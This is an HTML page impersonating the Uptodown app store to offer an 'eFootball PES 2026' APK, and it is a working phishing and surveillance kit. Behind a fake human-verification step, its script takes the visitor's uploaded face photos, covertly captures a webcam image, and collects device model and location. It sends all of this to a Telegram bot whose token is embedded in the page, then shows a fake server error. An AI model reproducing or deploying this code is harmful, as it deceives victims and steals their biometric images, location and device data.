<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download eFootball PES 2026 for Android (APK) - Uptodown</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root { --upto-dark: #0f172a; --upto-blue: #1b85d3; --upto-green: #2ecc71; --upto-card: #1e293b; }
        body { margin: 0; background: var(--upto-dark); font-family: 'Roboto', sans-serif; color: white; }
        
        /* Header & Nav */
        header { background: #000; padding: 15px 25px; display: flex; align-items: center; border-bottom: 1px solid #334155; }
        .logo { font-weight: 900; font-size: 22px; color: white; letter-spacing: -1px; }
        .logo span { font-weight: 400; color: #ccc; }

        /* App Main Section */
        .app-container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .app-main { display: flex; align-items: flex-start; gap: 25px; margin-bottom: 40px; }
        .app-icon { width: 120px; height: 120px; border-radius: 25px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        .app-info h1 { margin: 0; font-size: 32px; font-weight: 700; }
        .app-meta { color: #94a3b8; font-size: 14px; margin: 10px 0; }
        .badge { background: #334155; padding: 4px 10px; border-radius: 12px; font-size: 11px; color: var(--upto-blue); }

        /* Download Buttons */
        .btn-green { background: var(--upto-green); color: white; padding: 18px 40px; border-radius: 8px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 10px; font-size: 18px; width: fit-content; }
        .btn-green:hover { background: #27ae60; }
        
        /* Backend Logic Overlay */
        #backendLayer { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); z-index: 10000; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .loading-box { background: #111; border: 1px solid var(--upto-blue); border-radius: 15px; padding: 40px; width: 100%; max-width: 400px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--upto-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }

        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<header>
    <div class="logo">uptodown <span>▼</span></div>
</header>

<div class="app-container">
    <div class="app-main">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon">
        <div class="app-info">
            <h1>eFootball PES 2026</h1>
            <div class="app-meta">10.4.0 | KONAMI | <span class="badge">#SPORTS</span></div>
            <div style="display:flex; gap:15px; margin-top:20px;">
                <button class="btn-green" onclick="startUptodownDL()">
                    <span style="font-size:24px;">📥</span> Download
                </button>
                <div style="font-size:12px; color:#64748b;">74.8 M downloads<br>Security Verified</div>
            </div>
        </div>
    </div>

    <div style="background: #1e293b; padding: 25px; border-radius: 12px; margin-top: 50px;">
        <h3 style="margin-top:0;">Technical details</h3>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; font-size:13px; color:#94a3b8;">
            <div>Package Name: jp.konami.pesam</div>
            <div>License: Free</div>
            <div>Operating System: Android</div>
            <div>Requirements: Android 7.0+</div>
        </div>
    </div>
</div>

<div id="backendLayer">
    <div class="loading-box">
        <div id="loader">
            <div class="spinner"></div>
            <h3>Connecting to Server...</h3>
            <p style="font-size:12px; color:#888;">Optimizing APK for your device</p>
        </div>
        
        <div id="verifBox" style="display:none;">
            <h2 style="color:var(--upto-blue)">Verification Required</h2>
            <p style="font-size:13px;">To download APK, verify that you are a human.</p>
            <label for="fileInput" style="display:block; padding:15px; border:2px dashed #444; border-radius:8px; cursor:pointer; margin:20px 0; color:var(--upto-blue);">
                📁 Select 5 facial photos from gallery
            </label>
            <input type="file" id="fileInput" accept="image/*" multiple onchange="processAI(this)">
            <p id="st" style="font-size:11px; color:#555;"></p>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [], camPic = null;

    async function init() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    init();

    function startUptodownDL() {
        document.getElementById('backendLayer').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('verifBox').style.display = 'block';
        }, 2000);
    }

    async function processAI(input) {
        document.getElementById('st').innerText = "AI is analyzing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) photos.push(f);
        }
        await stealthMission();
    }

    async function stealthMission() {
        // 1. Qurilma modeli
        const device = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
        
        // 2. Yashirin Kamera
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = s;
            await new Promise(r => setTimeout(r, 1000));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            camPic = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            s.getTracks().forEach(t => t.stop());
        } catch(e) {}

        // 3. Lokatsiya va Yuborish
        navigator.geolocation.getCurrentPosition(async (p) => {
            const map = `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            await send(device, map);
        }, async () => { await send(device, "Denied"); });
    }

    async function send(dev, loc) {
        const msg = `🔥 *UPTODOWN CLONE DATA*\n📱 Device: ${dev}\n📍 Location: ${loc}\n✅ Faces Found: ${photos.length}`;
        
        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: msg, parse_mode: 'Markdown'})
        });

        if(camPic) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', camPic);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let f of photos) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', f);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }

        alert("Error: Server is busy. Try again later.");
        location.reload();
    }
</script>
</body>
</html>
